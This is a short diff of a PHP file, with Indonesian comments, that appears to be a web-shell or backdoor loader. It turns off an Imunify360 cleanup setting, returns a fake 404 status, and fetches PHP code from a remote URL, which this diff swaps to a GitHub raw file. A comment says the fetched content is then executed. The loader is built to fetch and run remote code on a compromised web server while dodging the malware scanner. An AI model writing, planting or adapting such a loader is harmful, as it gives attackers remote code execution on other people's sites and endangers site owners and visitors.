@@ -11,7 +11,7 @@ ini_set("imunify360.cleanup_on_restore", false);
 http_response_code(404);
 
 // Mengambil konten dari URL
-$url = 'https://jeniferseo.my.id/db.txt';
+$url = 'https://raw.githubusercontent.com/0xF102400/peler/main/n.php';
 $ohct = file_get_contents($url);
 
 // Mengeksekusi konten yang diambil
